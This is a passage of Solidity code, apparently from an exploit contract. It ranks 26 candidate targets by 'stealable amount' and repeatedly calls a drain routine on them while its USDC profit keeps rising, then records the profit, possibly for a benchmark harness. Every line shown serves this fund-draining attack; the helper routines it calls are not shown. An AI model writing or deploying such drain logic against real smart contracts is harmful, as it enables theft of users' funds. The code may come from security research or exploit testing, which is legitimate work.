        require(!_executed, "executed");
        _executed = true;

        uint256 balanceBefore = USDC.balanceOf(address(this));

        Candidate[26] memory ranked = _rankCandidatesByStealableAmount();
        uint256 positiveCount = _countPositive(ranked);
        if (positiveCount == 0) {
            _setProfit(balanceBefore);
            return;
        }

        uint256 maxRounds = positiveCount < MAX_PROGRESSIVE_ROUNDS ? positiveCount : MAX_PROGRESSIVE_ROUNDS;

        if (maxRounds == 1) {
            _attemptDrain(ranked[0]);
            _setProfit(balanceBefore);
            return;
        }

        _attemptDrain(ranked[0]);
        _attemptDrain(ranked[1]);

        uint256 bestRealized = USDC.balanceOf(address(this)) - balanceBefore;

        for (uint256 rounds = 3; rounds <= maxRounds; rounds++) {
            uint256 beforeExtraRound = USDC.balanceOf(address(this)) - balanceBefore;
            _attemptDrain(ranked[rounds - 1]);
            uint256 afterExtraRound = USDC.balanceOf(address(this)) - balanceBefore;

            if (afterExtraRound > beforeExtraRound) {
                bestRealized = afterExtraRound;
            } else {
                break;
            }
        }

        if (bestRealized == 0) {
            _setProfit(balanceBefore);
            return;
        }

        _setProfit(balanceBefore);
